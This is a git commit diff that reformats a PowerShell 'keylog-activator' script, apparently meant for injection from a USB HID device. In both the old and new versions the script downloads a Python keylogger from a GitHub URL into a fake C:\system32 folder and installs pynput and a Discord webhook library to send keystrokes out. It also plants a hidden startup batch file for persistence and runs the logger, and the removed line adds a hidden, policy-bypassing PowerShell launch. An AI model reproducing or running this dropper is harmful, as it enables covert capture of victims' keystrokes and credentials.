ef8f8835ca1951094b6ce38b407a02f8b21127a8
simen64 <97337442+simen64@users.noreply.github.com>
2023-10-06 00:21:16 +0200

    structured the script

--- discord-keylogger/keylog-activator.ps1
+++ discord-keylogger/keylog-activator.ps1
@@ -1,2 +1,13 @@
-powershell -w h -NoP -NonI -Exec Bypass -c "mkdir 'C:\system32\' ; cd C:\system32\ ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile C:\system32\sys-file.py ; py -m pip install discordwebhook pynput ; '@echo off', 'start /B pythonw.exe "C:\system32\sys-file.py"' | Set-Content -Path 'C:\system32\startup.bat'
-; cp 'C:\system32\startup.bat' '$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' ; Python sys-file.py $dc"
+mkdir 'C:\system32\'
+
+cd C:\system32\
+
+iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile C:\system32\sys-file.py
+
+py -m pip install discordwebhook pynput
+
+'@echo off', 'start /B pythonw.exe "C:\system32\sys-file.py"' | Set-Content -Path 'C:\system32\startup.bat'
+
+Copy-Item 'C:\system32\startup.bat' "$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+Python sys-file.py $dc
